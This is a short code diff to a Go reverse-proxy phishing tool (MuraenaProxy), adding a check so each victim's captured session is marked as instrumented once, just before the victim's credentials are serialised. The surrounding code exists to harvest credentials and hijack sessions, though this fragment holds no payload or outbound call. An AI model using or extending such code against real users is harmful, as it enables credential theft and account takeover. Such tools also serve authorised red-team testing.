@@ -579,7 +579,10 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 								}
 							}
 
-							if getSession {
+							if getSession && !victim.SessionInstrumented {
+								// Set the flag BEFORE calling Instrument to prevent races
+								_ = db.SetSessionAsInstrumented(victim.ID)
+
 								// Pass credentials
 								creds, err := json.MarshalIndent(victim.Credentials, "", "\t")
 								if err != nil {
